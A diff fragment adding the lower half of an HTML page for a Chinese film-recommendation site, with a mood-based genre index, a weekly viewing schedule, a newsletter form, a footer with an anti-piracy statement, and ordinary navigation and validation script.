+    <div class="sec-h rev"><span class="tag">NO.5</span><h2>类型<em>索引</em> · 按「想被怎样打动」找片</h2><span class="en">INDEX</span><a class="more" href="#">按年代 / 按国家 →</a></div>
+    <div class="idxbox rev">
+      <div class="film">
+        <a href="#"><b>想被安慰</b><em>12 部 · 家庭 / 日常</em></a>
+        <a href="#"><b>想被吓到</b><em>9 部 · 悬疑 / 惊悚</em></a>
+        <a href="#"><b>想哭一场</b><em>7 部 · 成长 / 离别</em></a>
+        <a href="#"><b>想烧点脑</b><em>11 部 · 非线性 / 结构</em></a>
+        <a href="#"><b>想安静一会</b><em>8 部 · 慢 / 风景</em></a>
+        <a href="#"><b>想笑出来</b><em>6 部 · 黑色 / 荒诞</em></a>
+        <a href="#"><b>想看爱情</b><em>14 部 · 爱情 / 错过</em></a>
+        <a href="#"><b>想看远方</b><em>10 部 · 公路 / 异国</em></a>
+        <a href="#"><b>想看人性</b><em>9 部 · 社会 / 群像</em></a>
+        <a href="#"><b>想看长镜</b><em>5 部 · 一镜到底</em></a>
+        <a href="#"><b>想看黑白</b><em>6 部 · 黑白 / 老片</em></a>
+        <a href="#"><b>想看童年</b><em>8 部 · 儿童视角</em></a>
+      </div>
+      <aside class="side">
+        <h4>▲ 按片名首字母</h4>
+        <div class="alph">
+          <a href="#">A</a><a href="#">B</a><a href="#">C</a><a href="#">D</a><a href="#">E</a><a href="#">F</a>
+          <a href="#">G</a><a href="#">H</a><a href="#">J</a><a href="#">K</a><a href="#">L</a><a href="#">M</a>
+          <a href="#">N</a><a href="#">P</a><a href="#">Q</a><a href="#">R</a><a href="#">S</a><a href="#">T</a>
+          <a href="#">W</a><a href="#">X</a><a href="#">Y</a><a href="#">Z</a><a href="#">#</a><a href="#">?</a>
+        </div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ⑥ 追剧时刻 ==================== -->
+<section id="clk">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.6</span><h2>追剧<em>时刻</em> · 一周七天，七种「挤出时间」的看片法</h2><span class="en">85 MINUTES A DAY</span><a class="more" href="#">导出到日历 →</a></div>
+    <div class="clock rev">
+      <div class="it"><div class="t">MON<small>周一 · 通勤</small></div><h4>看一段 85 秒长镜</h4><div class="bar"><i style="width:28%"></i></div><div class="mi">5′</div></div>
+      <div class="it"><div class="t">TUE<small>周二 · 午休</small></div><h4>读一篇导演访谈</h4><div class="bar"><i style="width:36%"></i></div><div class="mi">15′</div></div>
+      <div class="it"><div class="t">WED<small>周三 · 睡前</small></div><h4>看一部 85 分钟短片</h4><div class="bar"><i style="width:50%"></i></div><div class="mi">42′</div></div>
+      <div class="it on"><div class="t">THU<small>周四 · 更新日</small></div><h4>读 85 电影网本期</h4><div class="bar"><i style="width:58%"></i></div><div class="mi">12′</div></div>
+      <div class="it"><div class="t">FRI<small>周五 · 晚</small></div><h4>看一部「长大才懂」的片</h4><div class="bar"><i style="width:72%"></i></div><div class="mi">110′</div></div>
+      <div class="it"><div class="t">SAT<small>周六 · 下午</small></div><h4>连看同一导演两部</h4><div class="bar"><i style="width:90%"></i></div><div class="mi">220′</div></div>
+      <div class="it"><div class="t">SUN<small>周日 · 傍晚</small></div><h4>重看一部，写三行</h4><div class="bar"><i style="width:44%"></i></div><div class="mi">95′</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 订阅 ==================== -->
+<section id="joinS">
+  <div class="container">
+    <div class="join rev">
+      <div>
+        <h3>订阅「<i>85 电影网 · 每周 85 分钟</i>」</h3>
+        <p>每周五 20:00，一条短推送：<strong>一部 85 分钟以内的片</strong> + <strong>一个可复用的看片方法</strong> + <strong>一段值得重看的镜头</strong>。帮你从「看过很多」走到「看懂一些」。不群发、不推销、不附盗链、可一键退订。</p>
+      </div>
+      <form id="sub" novalidate>
+        <input type="email" id="mail" placeholder="留下邮箱，周五上路" aria-label="邮箱" required>
+        <button type="submit">订阅</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 页脚 ==================== -->
+<footer>
+  <div class="container">
+    <div class="fgrid">
+      <div class="ft">
+        <a class="logo" href="#"><span class="num">85</span><b style="color:#fff">电影网</b><em>EIGHTY-FIVE CINEMA</em></a>
+        <p>85电影网是一个原创的<strong>八五后观影方法与片单</strong>站点，专注三件事：<strong>85 部必看片单</strong>（长大之后才看懂的片）、<strong>85 分钟以内的短片与长镜</strong>（给没整块时间的人）、<strong>1985 年前后出生的导演谱系</strong>（认导演比认类型可靠）。我们用 8 部八五片单 + 5 档 85 分钟片单 + 6 位导演谱系 + 12 种情绪索引 + 7 天追剧时刻，把「看懂电影」这件事讲清楚。本站<strong>只做收录与原创解读，不提供任何影视资源下载与盗链</strong>，倡导通过影院与正规视频平台观看。</p>
+      </div>
+      <div class="fcol"><h4>快速入口</h4><a href="#list">八五片单</a><a href="#min">85 分钟</a><a href="#au">导演谱系</a><a href="#hot">口碑榜</a><a href="#idx">类型索引</a><a href="#clk">追剧时刻</a></div>
+      <div class="fcol"><h4>观影方法</h4><a href="#">二刷法</a><a href="#">长镜怎么看</a><a href="#">台词笔记</a><a href="#">片头三分钟</a><a href="#">认导演不认类型</a><a href="#">写三行</a></div>
+      <div class="fcol"><h4>关于</h4><a href="#">八五是什么</a><a href="#">选片四条原则</a><a href="#">版权与正版声明</a><a href="#">投稿与合作</a><a href="#">观影礼仪</a></div>
+    </div>
+    <div class="copy">© 2026 85电影网 版权所有 · 网址：<a href="https://85dianyingwang-cn.github.io/">https://85dianyingwang-cn.github.io/</a> · 影视请通过影院与正规视频平台观看</div>
+  </div>
+</footer>
+
+<script>
+var bg=document.getElementById('burger'),ls=document.getElementById('links');
+bg.addEventListener('click',function(){ls.classList.toggle('open');bg.setAttribute('aria-expanded',ls.classList.contains('open'));});
+ls.addEventListener('click',function(e){if(e.target.tagName==='A'){ls.classList.remove('open');bg.setAttribute('aria-expanded','false');}});
+
+var secs=['top','list','min','au','hot','idx','clk'].map(function(id){return document.getElementById(id);});
+var as=document.querySelectorAll('.links a');
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+150,cur='';
+  secs.forEach(function(s){if(s&&s.offsetTop<=y)cur=s.id;});
+  as.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur);});
+},{passive:true});
+
+var io=new IntersectionObserver(function(es){
+  es.forEach(function(e,i){if(e.isIntersecting){setTimeout(function(){e.target.classList.add('in');},i*50);io.unobserve(e.target);}});
+},{threshold:.1});
+document.querySelectorAll('.rev').forEach(function(el){io.observe(el);});
+
+document.getElementById('sub').addEventListener('submit',function(e){
+  e.preventDefault();
+  var v=document.getElementById('mail').value.trim();
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)){alert('邮箱格式不对，明信片寄不出去 ◐');return;}
+  alert('订阅成功！本周五 20:00，第一部 85 分钟的片，上路 ▲');
+  document.getElementById('mail').value='';
+});
+</script>
+</body>
+</html>
